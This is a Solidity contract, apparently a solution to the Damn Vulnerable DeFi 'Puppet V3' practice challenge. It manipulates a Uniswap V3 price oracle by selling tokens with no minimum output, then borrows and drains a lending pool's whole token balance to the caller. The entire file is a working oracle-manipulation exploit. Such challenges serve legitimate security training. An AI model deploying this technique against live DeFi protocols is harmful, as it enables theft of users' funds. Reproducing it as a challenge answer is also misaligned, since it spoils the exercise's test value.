// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;
pragma abicoder v2;

import "./PuppetV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract Exploit_PuppetV3 {
    PuppetV3Pool public lendingPool;
    IERC20Minimal immutable weth;
    IERC20Minimal immutable token;

    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    constructor(PuppetV3Pool _lendingPool) {
        lendingPool = _lendingPool;
        weth = lendingPool.weth();
        token = lendingPool.token();
    }

    function exploit() public {
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
        lendingPool.borrow(token.balanceOf(address(lendingPool)));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function sellTokens() public {
        sell(address(token), address(weth), token.balanceOf(address(this)));
    }

    function sell(address tokenIn, address tokenOut, uint amountIn) public {
        IERC20Minimal(tokenIn).approve(address(router), amountIn);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(params);
    }
}
